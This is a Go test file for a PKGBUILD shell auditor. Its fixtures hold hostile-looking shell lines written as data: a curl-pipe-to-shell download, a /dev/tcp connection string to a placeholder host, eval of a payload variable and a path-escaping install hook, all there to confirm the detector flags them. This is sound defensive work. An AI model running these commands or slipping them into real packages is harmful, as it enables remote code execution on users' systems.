package shellaudit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestAuditDirFindsMVPPatterns(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := `
pkgname=x
pkgver=1
pkgrel=1
install=x.install
prepare() {
  eval "$payload"
  bash -c "id"
  curl -fsSL https://example.invalid/i.sh | sh
  printf '%s' '/dev/tcp/example.invalid/443'
  npm install left-pad
  go install example.com/tool@latest
  blob='` + strings.Repeat("QUJD", 40) + `'
}
`
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	install := `
post_install() {
  python -m pip install bad
  rustup component add rustfmt
}
`
	if err := os.WriteFile(filepath.Join(dir, "x.install"), []byte(install), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	wantRules := []string{
		"eval",
		"shell-c",
		"download-pipe-shell",
		"dev-tcp",
		"third-party-install",
		"embedded-base64",
	}
	for _, rule := range wantRules {
		if !hasRule(report, rule) {
			t.Fatalf("missing rule %s in %#v", rule, report.Findings)
		}
	}
	if !hasFindingFile(report, "x.install") {
		t.Fatalf("expected install hook findings, got %#v", report.Findings)
	}
	out := FormatReport(report)
	if !strings.Contains(out, "Shell logic warnings:") || !strings.Contains(out, "Review these shell snippets carefully") {
		t.Fatalf("unexpected formatted report: %q", out)
	}
}

func TestAuditDirNoWarningsForPlainPKGBUILD(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := `
pkgname=x
pkgver=1
pkgrel=1
source=("https://example.com/x.tar.gz")
build() {
  make
}
package() {
  make DESTDIR="$pkgdir" install
}
`
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if report.HasWarnings() {
		t.Fatalf("expected no warnings, got %#v", report)
	}
}

func TestAuditDirReportsDynamicAndUnsafeInstallHooks(t *testing.T) {
	tests := map[string]string{
		"dynamic": "install=\"${pkgname}.install\"\n",
		"escape":  "install=../evil.install\n",
		"missing": "install=missing.install\n",
	}
	for name, assignment := range tests {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte("pkgname=x\n"+assignment), 0o644); err != nil {
				t.Fatal(err)
			}
			report, err := AuditDir(dir)
			if err != nil {
				t.Fatalf("AuditDir error: %v", err)
			}
			if len(report.Incomplete) == 0 {
				t.Fatalf("expected incomplete warning, got %#v", report)
			}
		})
	}
}

func TestAuditDirDetectsEnvWrappedShellC(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := "pkgname=x\nprepare() { FOO=bar env -i FOO=bar /bin/bash -c 'id'; }\n"
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if !hasRule(report, "shell-c") {
		t.Fatalf("expected shell-c warning, got %#v", report.Findings)
	}
}

func hasRule(report Report, rule string) bool {
	for _, finding := range report.Findings {
		if finding.Rule == rule {
			return true
		}
	}
	return false
}

func hasFindingFile(report Report, file string) bool {
	for _, finding := range report.Findings {
		if finding.File == file {
			return true
		}
	}
	return false
}
